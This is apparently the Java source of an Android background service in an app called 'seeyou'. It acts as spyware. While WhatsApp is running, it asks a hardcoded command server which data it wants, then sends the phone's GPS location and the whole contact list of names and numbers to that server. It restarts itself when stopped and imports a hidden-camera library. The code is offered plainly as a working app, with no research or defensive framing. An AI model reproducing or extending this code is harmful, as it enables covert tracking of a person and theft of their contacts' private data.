package com.example.tamir.seeyou;

import android.app.Activity;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.SurfaceTexture;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;

import com.androidhiddencamera.CameraConfig;
import com.androidhiddencamera.HiddenCameraService;
import com.androidhiddencamera.config.CameraFacing;
import com.androidhiddencamera.config.CameraImageFormat;
import com.androidhiddencamera.config.CameraResolution;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.lang.ref.WeakReference;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

/**
 * Created by Tamir on 30/06/2017.
 */

public class MainService extends IntentService {
    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */

    final static String APPLICATION = "com.whatsapp";
    final static String CAMERA = "camera";
    final static String CONTACS = "contacs";
    final static String LOCATION = "location";
    final static String POST = "post";
    final static String GET = "get";
    final static String YES = "yes";
    final static String NO = "no";
    private static final int CAMERA_REQUEST = 2000;
    // TIMER in milisec
    final static long TIMER = 50000; //50 sec
    // URLS
    private static final String CAMERA_URL  = "http://192.168.1.13:3000/api/getFunction";
    private static final String SET_LOCATION_URL  = "http://192.168.1.13:3000/api/setLocation";
    private static final String GET_ACTION  = "http://192.168.1.13:3000/api/getAction";
    private static final String SET_CONTACS_URL  = "http://192.168.1.13:3000/api/setContacs";

    public JSONObject json_contacs;
    public JSONObject json_location;
    public String current_url;
    public JSONObject current_json;

    // Handler
    private static class MyHandler extends Handler {}
    private final MyHandler mHandler = new MyHandler();
    // context
    private Context mContext;
    //
    String locationResult = null;
    String contacsResult = null;

    public MainService() {
        super("Main_Service");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "Service Started..", Toast.LENGTH_LONG).show();
        mContext = getApplicationContext();
        return super.onStartCommand(intent, flags, startId);

    }

    @Override
    public void onDestroy() {
        Toast.makeText(this, "Service Stopped..", Toast.LENGTH_LONG).show();
        //START again service
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent restartService = new Intent(mContext, RestartService.class);
                sendBroadcast(restartService);
            }
        }, TIMER);
        Log.e("STOP","STOP");
        super.onDestroy();
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            if (Helper.isAppRunning(mContext, APPLICATION)) {
                Log.e("APP", "APP is running");
                String action = getToServer(GET_ACTION);
                JSONObject json = new JSONObject(action);
                String location = json.getString(LOCATION);
                // Location
                if (location.equals(YES)) {
                    LocationProvider locationProvider = new LocationProvider(getApplicationContext());
                    json_location = new JSONObject();
                    json_location.put("longitude", locationProvider.getLongitude());
                    json_location.put("latitude", locationProvider.getLatitude());
                    locationResult = postToServer(SET_LOCATION_URL, json_location);
                }
                //String camera = json.getString(CAMERA);
                // Contacs
                String contacs = json.getString(CONTACS);
                if (contacs.equals(YES)) {
                    json_contacs = getAddressBook(mContext);
                    contacsResult = postToServer(SET_CONTACS_URL, json_contacs);
                }
            } else { // App is not running
                Log.e("App not running", "App not running");
            }
        } catch (Exception e) {
            e.printStackTrace();
            onDestroy();
        }
    }

    private String postToServer(String website, JSONObject json){
        return sendToServer(website,json,POST);
    }
    private String getToServer(String website) {
        return sendToServer(website,null,GET);
    }

    // POST
    private String sendToServer(String website, JSONObject json,String method) {
        HttpURLConnection connection = null;
        BufferedReader reader = null;
        try {
            // Create connection
            URL url = new URL(website);
            connection = (HttpURLConnection) url.openConnection();
            // Check if method is POST
            if (method.equals(POST)) {
                // Post option
                connection.setRequestMethod("POST");
                //connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                connection.setRequestProperty("Accept", "application/json");
                connection.setDoOutput(true);
                connection.setDoInput(true);

                DataOutputStream out = new DataOutputStream(connection.getOutputStream());
//                out.writeBytes(json.toString());
//                out.flush();
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
                writer.write(json.toString());
                writer.close();
                out.close();
            }

            // Response from remote server
            InputStream stream  = connection.getInputStream();
            reader = new BufferedReader(new InputStreamReader(stream));
            StringBuffer buffer = new StringBuffer();
            String line = "";
            while ((line = reader.readLine()) != null ) {
                buffer.append(line);
            }
            //connection.disconnect();
            return buffer.toString();

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }  finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return "";
    }

    public JSONObject getAddressBook(Context context) throws JSONException
    {
        boolean isCheck = false;
        JSONArray json_array = new JSONArray();
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        while(cursor.moveToNext())
        {
            JSONObject json = new JSONObject();
            int phone_idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int name_idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            String phone = cursor.getString(phone_idx);
            String name = cursor.getString(name_idx);
            json.put("name", name);
            json.put("phone", phone);
            json_array.put(json);
            if (!isCheck) {
                Log.e("name", name);
                Log.e("name2", json.getString("name"));
                isCheck=true;
            }

        }
        cursor.close();
        JSONObject result = new JSONObject();
        result.put("contacs", json_array);
        return result;
    }
}

// BACKUP - working with multiple threds
//    @Override
//    protected void onHandleIntent(Intent intent) {
//        try {
//
//            if (Helper.isAppRunning(mContext, APPLICATION)) {
//                Log.e("APP", "APP is running");
//                String action = getToServer(GET_ACTION);
//                JSONObject json = new JSONObject(action);
//                String location = json.getString(LOCATION);
//                // Location
//                if (location.equals(YES)) {
//                    LocationProvider locationProvider = new LocationProvider(getApplicationContext());
//                    json_location = new JSONObject();
//                    json_location.put("longitude", locationProvider.getLongitude());
//                    json_location.put("latitude", locationProvider.getLatitude());
//                    Thread thread = new Thread(new Runnable() {
//                        @Override
//                        public void run() {
//                            locationResult = postToServer(SET_LOCATION_URL, json_location);
//                            Log.e("result:location: ", locationResult);
//                        }
//                    });
//                    thread.start();
//                }
//                //String camera = json.getString(CAMERA);
//                // Contacs
//                String contacs = json.getString(CONTACS);
//                if (contacs.equals(YES)) {
//                    json_contacs = getAddressBook(mContext);
//                    Thread thread = new Thread(new Runnable() {
//                        @Override
//                        public void run() {
//                            contacsResult = postToServer(SET_CONTACS_URL, json_contacs);
//                            //Log.e("RESULT: CONTACS", contacsResult);
//                        }
//                    });
//                    thread.start();
//                }
//
//
//            } else { // App is not running
//                Log.e("bad", "bad");
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//            onDestroy();
//        }
//
//
//    }
